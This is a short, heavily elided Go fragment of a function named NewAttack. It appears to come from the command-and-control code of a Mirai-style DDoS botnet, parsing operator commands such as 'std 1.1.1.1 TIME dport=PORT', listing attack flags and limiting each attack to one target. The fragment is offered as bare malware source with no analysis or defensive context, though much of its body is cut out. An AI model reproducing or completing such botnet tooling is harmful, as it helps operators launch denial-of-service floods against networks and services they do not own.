...
func NewAttack(str string, admin int) (*Attack, error) {
	...
	if len(args) == 0 {
		...
		if !exists {
			return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[32mis not a valid command!", args[0]))
		}
	...
	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("Not Valid Example: std 1.1.1.1 TIME dport=PORT")
	} else {
		if args[0] == "?" {
	...
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\033[32mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
	...
	if len(atk.Targets) > 1 {
		return atk, errors.New("you can only attack one target at a time")
	}
